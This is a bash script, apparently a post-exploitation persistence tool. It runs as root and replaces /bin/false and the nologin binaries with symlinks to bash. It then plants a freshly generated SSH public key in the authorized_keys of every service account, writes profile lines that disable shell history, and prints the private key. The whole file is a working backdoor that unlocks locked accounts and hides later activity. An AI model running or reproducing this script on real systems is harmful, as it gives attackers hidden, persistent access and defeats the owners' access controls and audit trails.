#!/bin/bash
# DESCRIPTION: Allows all users to login and gives ssh keys

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Script must be run as root"
    exit
fi

echo "=== Removing login restrictions and generating SSH keys ==="

rm temp 2> /dev/null
rm temp.pub 2> /dev/null
keygen=`ssh-keygen -t ed25519 -f temp -N ""`

PRIVKEY=`cat temp`
PUBKEY=`cat temp.pub`

# Remove nologin bins
rm /bin/false 2> /dev/null
rm /usr/sbin/nologin 2> /dev/null
rm /sbin/nologin 2> /dev/null

# Link nologin bins to bash
ln -s /bin/bash /bin/false 2> /dev/null
ln -s /bin/bash /usr/sbin/nologin 2> /dev/null
ln -s /bin/bash /sbin/nologin 2> /dev/null

# Find all nologin user's homedirs
echo "=== Writing credentials ==="
for homedir in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f6); do
    mkdir -p $homedir/.ssh 2> /dev/null
    touch $homedir/.ssh/authorized_keys 2> /dev/null
    touch $homedir/.bash_profile 2> /dev/null
    echo 'unset HISTFILE' >> $homedir/.bash_profile 2> /dev/null
    echo 'set +o history' >> $homedir/.bash_profile 2> /dev/null
    echo $PUBKEY >> $homedir/.ssh/authorized_keys
    echo "Wrote creds to $homedir"
done

echo "=== Users that now have SSH access ==="
for user in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f1); do
	echo $user
done

echo "=== Private Key ==="
echo $PRIVKEY

rm temp 2> /dev/null
rm temp.pub 2> /dev/null
